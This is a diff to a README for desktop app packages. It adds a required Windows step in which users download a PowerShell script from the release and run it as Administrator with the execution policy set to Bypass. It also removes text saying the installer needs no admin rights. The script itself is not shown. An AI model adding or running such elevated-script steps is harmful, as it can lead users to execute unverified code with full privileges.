@@ -48,8 +48,18 @@ When a prepack release is published, download the installer directly from the [N
 | Debian/Ubuntu | `youtube-*.deb`, `gmail-*.deb`, `google-analytics-*.deb` |
 | Fedora/RPM | `youtube-*.rpm`, `gmail-*.rpm`, `google-analytics-*.rpm` |
 | Windows | `youtube-*-setup.exe`, `gmail-*-setup.exe`, `google-analytics-*-setup.exe` (NSIS) or the matching `.msi` |
+| Windows prerequisite | `Nimino-WebView2-Setup.ps1` (required before the Windows installer) |
 
 The [`Nimino Prepack Release`](.github/workflows/nimino-prepack-release.yml) workflow builds all three applications for every `v*` tag, attaches installers, SBOM files, and `SHA256SUMS` to the GitHub Release. The initial [`v0.1.0` release](https://github.com/asopitech-labs/nimino/releases/tag/v0.1.0) is available now. Verify the checksum before installing; the Popular Packages catalog remains separate until release signing and provenance verification are complete.
+
+**Windows prerequisite — do this before running the `.exe` or `.msi`:** download `Nimino-WebView2-Setup.ps1` from the same Release, open **Windows PowerShell as Administrator**, and run:
+
+```powershell
+Set-ExecutionPolicy -Scope Process Bypass
+& "$env:USERPROFILE\Downloads\Nimino-WebView2-Setup.ps1"
+```
+
+The script checks for and installs the WebView2 Evergreen Runtime with UAC elevation, then verifies the installed version. `WebView2Loader.dll` is included in the application package, but the Evergreen Runtime itself is not bundled in the installer. Do not skip this step.
 
 The definitions live in [`catalog/prepacks/`](catalog/prepacks/) and are covered by `make pack-prepack-test`. To create a runnable bundle, provide a compiled Nimino host:
 
@@ -83,7 +93,7 @@ sudo apt install ./dist/packages/*.deb
 sudo dnf install ./dist/packages/*.rpm
 ```
 
-For Windows, run the generated `*-setup.exe`. It is a per-user installer and normally does not require administrator privileges. Nimino uses the Windows WebView2 Evergreen Runtime; the installer does not bundle Chromium or WebView2. `make setup` can install or verify the runtime through elevated PowerShell before the application is started.
+For Windows, complete the WebView2 prerequisite above, then run the generated `*-setup.exe`. It is a per-user installer and normally does not require administrator privileges. `make setup` is the equivalent developer setup when working from a checkout.
 
 For an AppImage, make the file executable and run it:
 
